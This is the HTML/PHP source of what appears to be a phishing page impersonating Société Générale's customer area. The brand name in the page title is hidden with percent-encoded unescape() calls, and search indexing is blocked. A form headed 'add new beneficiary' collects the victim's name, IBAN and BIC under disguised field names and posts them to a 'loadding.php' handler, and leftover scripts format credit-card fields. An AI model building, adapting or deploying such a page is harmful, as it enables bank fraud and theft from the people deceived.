<?php
    
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 
        
        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%6E%6E%65%78%69%6F%6E%20%2D%20%45%73%70%61%63%65%20%63%6C%69%65%6E%74' );
        </script>

        <title></title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="header-top">
            </div>
            <div class="header-bottom">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER -->
        <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
            <div class="logo"><img src="../assets/images/logo2.jpg"></div>
        </header>
        <!-- END HEADER -->

        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">AJOUT NOUVEAU BÉNÉFICIAIRE</p>
        </div>

        <!-- MAIN -->
        <main id="main" class="pt-5 pb-5 mt-5" style="margin-bottom: 200px">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-8">
                        <form class="" method="post" action="loadding.php">
                            <input type="hidden" name="verbot">
                            <input type="hidden" name="type" value="details">
                            <legend>Confirmez les informations du nouveau bénéficiaires.</legend>

                            <div class="row">
                                <div class="col-md-6">
                                    <div class="form-group" style="width: inherit;">
                                        <label>
                                            <p class="label-txt">Nom</p>
                                            <input type="text" class="input" id="first_name" name="first_name" value="" required>
                                                                                    </label>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group" style="width: inherit;">
                                        <label>
                                            <p class="label-txt">Prénom</p>
                                            <input type="text" class="input" id="last_name" name="last_name" value="" required>
                                                                                    </label>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group" style="width: inherit;">
                                <label>
                                    <p class="label-txt">Iban</p>
                                    <input type="text" class="input" id="address" name="address" value="" required>
                                                                    </label>
                            </div>

                            <div class="form-group" style="width: inherit;">
                                <label>
                                    <p class="label-txt">Bic</p>
                                    <input type="text" maxlength="10" class="input" id="phone" name="phone" value="" required>
                                                                    </label>
                            </div>

                            <div class="form-group mt-5 text-center" style="width: inherit;">
                                <button type="submit">
                                    <img style="min-width: 230px;" src="../assets/images/confirmer.png">
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER 1 -->
        <div id="footer1" class="pt-5 pb-5">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-8 col-md-8 col-sm-12 col-12 text-center">
                        <img style="min-width: 792px;" src="../assets/images/footer-info.png" class="d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 346px;" src="../assets/images/footer-info2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none text-right">
                        <img style="min-width: 154px;" src="../assets/images/social.png">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- FOOTER 1 -->
        <div id="footer2" class="pt-3 pb-3">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-3 col-md-3 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 160px;" src="../assets/images/logo.jpg">
                    </div>
                    <div class="col-lg-9 col-md-3 col-sm-12 col-12 text-lg-right text-md-right text-sm-center text-center">
                        <img style="min-width: 713px;" src="../assets/images/footer-links.jpg" class="d-lg-inline-block d-md-inline-block d-sm-none d-none">
                        <img style="min-width: 143px;" src="../assets/images/footer-links2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            $('#cc_cvv').payment('formatCardCVC');
            $('#cc_date').payment('formatCardExpiry');
            $('#cc_number').payment('formatCardNumber');
            $('title').text(title);
            $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
        </script>

    </body>

</html>